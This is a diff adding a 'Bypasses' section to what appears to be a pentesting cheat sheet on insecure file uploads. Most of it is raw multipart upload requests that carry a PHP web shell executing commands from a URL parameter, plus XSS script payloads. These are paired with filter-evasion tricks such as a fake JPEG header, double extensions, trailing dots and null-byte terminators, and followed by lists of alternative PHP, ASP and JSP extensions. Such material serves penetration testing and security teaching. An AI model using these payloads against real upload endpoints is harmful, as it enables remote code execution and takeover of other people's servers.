@@ -177,3 +177,130 @@ system($_GET['cmd']);
 ?>
 -----------------------------4829104394923874193918493216
 ```
+# Bypasses
+
+#### Keeping The Image Header 
+`ÿØÿà` is the magic bytes for jpg file format.
+```
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="upload.jpg"
+Content-Type: text/html
+
+ÿØÿà
+<script>alert(0)</script>
+-----------------------------4829104394923874193918493216
+```
+
+#### Extention Parsing
+The following `upload.php.jpg` could be interpreted as PHP or JPG depending on how the server parses the filename.
+```
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="upload.php.jpg"
+Content-Type: text/php
+
+<?php 
+echo "shelled: ";
+system($_GET['cmd']); 
+?>
+-----------------------------4829104394923874193918493216
+```
+
+#### Trailing Dots
+```
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="upload.php."
+Content-Type: text/php
+
+<?php 
+echo "shelled: ";
+system($_GET['cmd']); 
+?>
+-----------------------------4829104394923874193918493216
+```
+
+#### Terminator
+If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: exploit.php;.jpg or exploit.php%00.jpg
+```
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="upload.php%00.jpg"
+Content-Type: text/php
+
+<?php 
+echo "shelled: ";
+system($_GET['cmd']); 
+?>
+-----------------------------4829104394923874193918493216
+```
+
+#### No File Extention
+Sometimes when no file extention is provided it will default to the content-type.
+```
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="upload."
+Content-Type: text/php
+
+<?php 
+echo "shelled: ";
+system($_GET['cmd']); 
+?>
+-----------------------------4829104394923874193918493216
+```
+
+```
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="upload."
+Content-Type: text/html
+
+<script>alert(1)</script>
+-----------------------------4829104394923874193918493216
+```
+
+#### Capitalization
+```
+.AsP
+.aSpX
+.PhP
+.hTMl
+.SvG
+.XmL
+.CoNfIg
+.HtaCceSs
+```
+
+#### PHP File Extention Bypasses
+The following file extentions can be used to act like a `.php` file upload:
+```
+.php 
+.php2
+.php3
+.php4
+.php5
+.php6
+.php7
+.phps
+.phps
+.pht
+.phtm
+.phtml
+.pgif
+.shtml
+.phar
+.inc
+```
+
+#### ASP File Extention Bypasses
+```
+.asp
+.aspx
+.cer
+.asa
+```
+
+#### JSP File Extention Bypasses
+```
+.jsp
+.jspx
+.jsw
+.jsv
+.jspf
+```
